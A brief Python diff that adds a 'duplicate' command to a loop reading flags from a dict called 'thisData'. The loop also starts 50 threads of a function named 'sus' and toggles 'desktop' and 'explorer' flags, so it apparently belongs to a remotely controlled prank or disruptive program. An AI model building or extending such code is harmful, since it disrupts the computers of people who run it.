@@ -158,6 +158,8 @@ while True:
             for tIdx in range(50):
                 t = threading.Thread(target=sus, daemon=True)
                 t.start()
+        if thisData["duplicate"] == 1:
+            duplicate()
         if thisData["desktop"] == 0:
             do_desktop = False
         if thisData["explorer"] == 0:
